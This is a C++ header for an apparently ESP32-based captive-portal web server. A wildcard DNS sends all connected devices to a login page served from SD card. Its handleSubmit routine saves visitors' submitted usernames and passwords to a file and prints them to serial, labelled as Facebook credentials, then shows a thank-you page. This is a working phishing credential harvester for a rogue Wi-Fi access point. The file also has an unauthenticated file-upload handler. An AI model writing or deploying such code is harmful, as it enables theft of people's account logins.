#ifndef WEB_SERVER_HANDLER_H
#define WEB_SERVER_HANDLER_H

#include "include.h"
#include "Authentication.h"


class WebServerManager 
{
protected:
    WebServer*             m_server;
    DNSServer*             m_dnsServer;
    SDCardManager*         m_sdManager;
    AuthenticationManager* m_authManager;
    String m_authPage = "\0";
    String m_thksPage = "\0";
    String m_adminPage= "\0";
    String m_datafile = "\0";

    inline String getContentType(String& filename)
    {
        if      (filename.endsWith(".html")) return "text/html";
        else if (filename.endsWith(".htm"))  return "text/html";
        else if (filename.endsWith(".css"))  return "text/css";
        else if (filename.endsWith(".js"))   return "application/javascript";
        else if (filename.endsWith(".png"))  return "image/png";
        else if (filename.endsWith(".jpg"))  return "image/jpeg";
        else if (filename.endsWith(".gif"))  return "image/gif";
        else if (filename.endsWith(".ico"))  return "image/x-icon";
        else if (filename.endsWith(".txt"))  return "text/plain";
        else if (filename.endsWith(".json")) return "application/json";
        else if (filename.endsWith(".xml"))  return "text/xml";
        else if (filename.endsWith(".pdf"))  return "application/pdf";
        else if (filename.endsWith(".zip"))  return "application/zip";

        return "application/octet-stream";
    }

    inline void setupCaptivePortal() { m_dnsServer->start(DNS_PORT, "*", WiFi.softAPIP()); }

    inline void handleRoot()
    {
        String content = m_sdManager->readFile(m_authPage.c_str());
        m_server->send(200, "text/html", content);
        Serial.println("New connection....");
    }

    inline void handleLogin()
    {
        if (m_server->method() == HTTP_POST)
        {
            String platform = m_server->arg("platform");
            String token = m_server->arg("token");

            if (m_authManager->validateSocialLogin(platform, token)) {
                m_server->send(200, "application/json", "{\"status\":\"success\"}");
            } else {
                m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
            }
        }
    }

    inline void handleSubmit()
    {
    //variables para almacenar temporalmente las entradas del usuario
        String credentials = "uid: " + m_server->arg("username");
        //String password 
        credentials.concat("\npsw: " + m_server->arg("password"));

        //guarda las entradas en un archivo de texto
        m_sdManager->appendFile(m_datafile.c_str(), credentials);

        //se imprime por consola los valores de las entradas
        Serial.println("Facebook id: "+ m_server->arg("username"));
        Serial.println("Password: "+ m_server->arg("password"));

        //se envia una respuesta con la segunda pagina
        m_server->send(200, "text/html", m_sdManager->readFile(m_thksPage.c_str()).c_str());
        Serial.print("There are currently ");
        Serial.print(WiFi.softAPgetStationNum());
        Serial.print(" hosts connected.");
    }

    inline void handleAdminPanel() {
        String username = m_server->arg("username");
        String password = m_server->arg("password");

        if (m_authManager->validateAdminCredentials(username, password))
        {
            String adminContent = m_sdManager->readFile(m_adminPage.c_str());
            m_server->send(200, "text/html", adminContent);
            Serial.println("New admin connection....");
        }
        else
        {
            m_server->send(401, "text/plain", "Access Denied");
            Serial.println("Intento de connexión como admin fallado.");
        }
    }

    inline void handleFileUpload() {
        HTTPUpload& upload = m_server->upload();
        File uploadFile;

        if (upload.status == UPLOAD_FILE_START)
        {
            String filename = upload.filename;
            if (!filename.startsWith("/")) filename = "/" + filename;
            
            m_sdManager->logEvent("File Upload Started: " + filename);
            
            uploadFile = m_sdManager->getFileSystem().open(filename, FILE_WRITE);
        } 
        else if (upload.status == UPLOAD_FILE_WRITE)
        {
            if (uploadFile) {
                uploadFile.write(upload.buf, upload.currentSize);
            }
        } 
        else if (upload.status == UPLOAD_FILE_END)
        {
            if (uploadFile)
            {
                uploadFile.close();
                m_sdManager->logEvent("File Upload Complete: " + upload.filename);
                m_server->send(200, "text/plain", "File Uploaded Successfully");
            }
            else
            {
                m_server->send(500, "text/plain", "Upload Failed");
            }
        }
    }

    inline void handleFileList()
    {
        File root = m_sdManager->getFileSystem().open("/");
        String fileList = "[";
        
        while (true)
        {
            File entry = root.openNextFile();
            if (!entry) break;
            
            fileList += "\"" + String(entry.name()) + "\",";
            entry.close();
        }
        
        // Remove last comma and close JSON array
        if (fileList.endsWith(","))
            fileList = fileList.substring(0, fileList.length() - 1);
        
        fileList += "]";
        
        m_server->send(200, "application/json", fileList);
    }

    inline void handleWiFiConfig()
    {
        if (m_server->method() == HTTP_POST)
        {
            String newSSID = m_server->arg("ssid");
            String newPassword = m_server->arg("password");
            
            // Validate input
            if (newSSID.length() >= 1 && newPassword.length() >= 8)
            {
                // Save configuration to SD card
                String config = newSSID + "\n" + newPassword;
                m_sdManager->writeFile("/wifi_config.txt", config);
                
                m_server->send(200, "text/plain", "WiFi Configuration Updated");
            }
            else
            {
                m_server->send(400, "text/plain", "Invalid Configuration");
            }
        }
    }

public:
    WebServerManager()
        : m_server(nullptr), m_dnsServer (nullptr), m_sdManager(nullptr), m_authManager(nullptr)
    {
    }

    WebServerManager(SDCardManager* sd, AuthenticationManager* auth, uint8_t port = SERVER_PORT) 
        : m_server(new WebServer (&port)), m_dnsServer (new DNSServer()), m_sdManager(sd), m_authManager(auth)
    {
    }

    WebServerManager(const WebServerManager&) = delete;

    WebServerManager operator= (const WebServerManager&) = delete;

    ~WebServerManager()
    {
        delete m_server,
               m_dnsServer,
               m_sdManager,
               m_authManager;
    }

    inline void start()
    {
        // Configure web server routes
        m_server->on("/", HTTP_GET, [this]() { handleRoot(); });
        m_server->on("/login", HTTP_POST, [this]() { handleLogin(); });
        m_server->on("/admin", HTTP_GET, [this]() { handleAdminPanel(); });

        // Start servers
        m_server->begin();
        setupCaptivePortal();

        Serial.println(SUCCESS_SERVER_INIT);
    }

    inline void process()
    {
        m_dnsServer->processNextRequest();
        m_server->handleClient();
    }

    inline void setPath(const char* path, FileType_t fileType)
    {
        switch (fileType)
        {
            case AUTHPAGE: m_authPage = path;
            break;

            case DATAFILE: m_datafile = path;
            break;
            
            case THANKSPAGE: m_thksPage = path;
            break;

            default: Serial.printf(ERROR_FILE_TYPE, String(fileType).c_str());
            break;
        }
    }

};
  

#endif